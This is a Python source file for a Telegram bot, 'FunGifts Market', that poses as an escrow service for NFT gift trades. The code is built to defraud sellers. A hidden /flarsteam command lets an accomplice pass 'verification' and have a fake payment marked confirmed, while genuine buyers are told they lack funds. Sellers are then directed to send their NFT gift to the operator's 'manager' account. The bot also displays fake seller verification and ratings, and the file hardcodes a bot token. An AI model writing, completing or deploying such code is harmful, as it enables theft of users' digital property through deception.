import asyncio
import sqlite3
import random
import string

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8660412675:AAEl4WR7DY38fD_qPInbxUljZ4WlwrZ4z4s"
BOT_USERNAME = "FunGiftsMarket_Bot"
MANAGER = "@ChicoLachovsku"

PHOTO = "AgACAgIAAxkBAAIDLmnKUlRt7mNdfhOmfQ4AAd7P67FNJQACBRVrG-jVUEr-uuhNjPbd0AEAAwIAA3kAAzoE"

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== БАЗА =====
db = sqlite3.connect("market.db")
cur = db.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS deals (
id TEXT,
seller_id INTEGER,
buyer_id INTEGER,
title TEXT,
amount TEXT,
currency TEXT,
status TEXT
)
""")
db.commit()

# ===== ДАННЫЕ =====
flarsteam_users = set()
user_last_message = {}

def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def is_verified(uid):
    return uid in flarsteam_users

# ===== UI =====
async def show_screen_by_id(user_id, text, kb=None):
    if user_id in user_last_message:
        try:
            await bot.delete_message(user_id, user_last_message[user_id])
        except:
            pass

    msg = await bot.send_photo(
        chat_id=user_id,
        photo=PHOTO,
        caption=text,
        reply_markup=kb,
        parse_mode="HTML"
    )

    user_last_message[user_id] = msg.message_id


async def show_screen(call, text, kb=None):
    await show_screen_by_id(call.from_user.id, text, kb)

# ===== STATES =====
class Deal(StatesGroup):
    currency = State()
    amount = State()
    title = State()

# ===== МЕНЮ =====
def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create")],
        [
            InlineKeyboardButton(text="📦 Мои сделки", callback_data="my"),
            InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")
        ],
        [
            InlineKeyboardButton(text="🏦 Реквизиты", callback_data="wallet"),
            InlineKeyboardButton(text="🌍 Язык", callback_data="lang")
        ],
        [
            InlineKeyboardButton(text="👥 Рефералы", callback_data="ref"),
            InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="info")
        ],
        [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/ChicoLachovsku")]
    ])

# ===== START =====
@dp.message(CommandStart())
async def start(msg: Message):
    if msg.text and "deal_" in msg.text:
        deal_id = msg.text.split("deal_")[1]

        cur.execute("SELECT * FROM deals WHERE id=?", (deal_id,))
        d = cur.fetchone()

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
        ])

        await show_screen_by_id(msg.from_user.id,
f"""💳 Информация о сделке #{deal_id}

👤 Вы покупатель в сделке.
📌 Продавец: @{d[1]}
📊 Успешных сделок у продавца: 0
⭐ Рейтинг продавца: 0.0/5
🔐 Верификация: ✅ Проверенный пользователь

• Вы покупаете: {d[3]}

🏦 Адрес для оплаты:
Не указан

💰 Сумма к оплате: {d[4]} {d[5]}
📝 Комментарий к платежу: #{deal_id}

⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой.
""", kb)
        return

    await show_screen_by_id(msg.from_user.id,
"""Добро пожаловать в FunGifts Market

Безопасные сделки с гарантией

<blockquote>
🛡️ Защита от мошенников
💰 Автоматическое удержание средств
📝 Прозрачная статистика
🎯 Поддержка 24/7
📊 История сделок
</blockquote>
""",
    main_menu())

# ===== FLARSTEAM =====
@dp.message(Command("flarsteam"))
async def flar(msg: Message):
    flarsteam_users.add(msg.from_user.id)
    await show_screen_by_id(msg.from_user.id, "✅ Вы успешно прошли верификацию!")

# ===== СОЗДАНИЕ =====
@dp.callback_query(F.data == "create")
async def create(call: CallbackQuery, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Банковская Карта RUB", callback_data="cur_RUB")],
        [InlineKeyboardButton(text="💵 Банковская Карта USD", callback_data="cur_USD")],
        [InlineKeyboardButton(text="💎 TON", callback_data="cur_TON")],
        [InlineKeyboardButton(text="⭐ Telegram Stars", callback_data="cur_STAR")],
        [InlineKeyboardButton(text="🌍 Любая Валюта", callback_data="cur_OTHER")]
    ])
    await state.set_state(Deal.currency)
    await show_screen(call, "💼 Сначала выберите валюту для сделки:", kb)

@dp.callback_query(F.data.startswith("cur_"))
async def currency(call: CallbackQuery, state: FSMContext):
    await state.update_data(currency=call.data.split("_")[1])
    await state.set_state(Deal.amount)
    await show_screen(call, "💰 Напишите сумму сделки:")

@dp.message(Deal.amount)
async def amount(msg: Message, state: FSMContext):
    await state.update_data(amount=msg.text)
    await state.set_state(Deal.title)
    await show_screen_by_id(msg.from_user.id, "📝 Теперь напишите название подарка:")

@dp.message(Deal.title)
async def title(msg: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = gen_id()

    cur.execute("INSERT INTO deals VALUES (?,?,?,?,?,?,?)",
                (deal_id, msg.from_user.id, None, msg.text,
                 data["amount"], data["currency"], "created"))
    db.commit()

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Отменить сделку", callback_data="back")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
    ])

    await show_screen_by_id(msg.from_user.id,
f"""✅ Сделка успешно создана!

💰 Сумма: {data['amount']}
💳 {data['currency']}
📜 Описание: {msg.text}

🔗 Ссылка для покупателя:
{link}""", kb)

    await state.clear()

# ===== ОПЛАТА =====
@dp.callback_query(F.data.startswith("pay_"))
async def pay(call: CallbackQuery):
    deal_id = call.data.split("_")[1]

    if not is_verified(call.from_user.id):
        await show_screen(call,
"""❌ Недостаточно средств для оплаты сделки.

💳 Пополните баланс и попробуйте снова.""")
        return

    cur.execute("UPDATE deals SET status='paid', buyer_id=? WHERE id=?",
                (call.from_user.id, deal_id))
    db.commit()

    cur.execute("SELECT * FROM deals WHERE id=?", (deal_id,))
    d = cur.fetchone()

    buyer = call.from_user.username or call.from_user.id

    text = f"""✅ Оплата подтверждена для сделки #{deal_id}

▫️ Покупатель: @{buyer}
▫️ Успешных сделок: 0
▫️ Рейтинг: 0.0/5
▫️ Верификация: ✅ Проверенный пользователь

▫️ Сумма: {d[4]} {d[5]}
▫️ Описание: {d[3]}

❗️ Пожалуйста, передайте NFT-подарок:
Только менеджеру бота для обработки:
{MANAGER}

⚠️ Обратите внимание:
➤ Подарок необходимо передать именно менеджеру {MANAGER}, а не покупателю напрямую.
➤ Это стандартный процесс для автоматического завершения сделки через бота.

После отправки менеджеру:
Подтвердите действие кнопкой ниже:
"""

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Подтвердить отправку подарка", callback_data=f"send_{deal_id}")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
    ])

    await show_screen(call, text, kb)
    await show_screen_by_id(d[1], text, kb)

# ===== ОТПРАВКА =====
@dp.callback_query(F.data.startswith("send_"))
async def send(call: CallbackQuery):
    deal_id = call.data.split("_")[1]

    cur.execute("SELECT * FROM deals WHERE id=?", (deal_id,))
    d = cur.fetchone()

    await show_screen(call, "✅ Вы подтвердили отправку подарка. Покупатель уведомлён.")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎉 Завершить сделку", callback_data=f"finish_{deal_id}")],
        [InlineKeyboardButton(text="❌ Оспорить", callback_data=f"dispute_{deal_id}")]
    ])

    await show_screen_by_id(d[2],
"""📦 Продавец подтвердил отправку подарка

Пожалуйста, подтвердите получение:""",
kb)

# ===== ЗАВЕРШЕНИЕ =====
@dp.callback_query(F.data.startswith("finish_"))
async def finish(call: CallbackQuery):
    await show_screen(call,
"""🎉 Сделка завершена!

Спасибо за использование FunGifts Market.""")

# ===== СПОР =====
@dp.callback_query(F.data.startswith("dispute_"))
async def dispute(call: CallbackQuery):
    await show_screen(call,
"""❗️ Заявка на спор отправлена в поддержку.

Ожидайте ответа администратора.""")

# ===== RUN =====
async def main():
    print("BOT STARTED")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
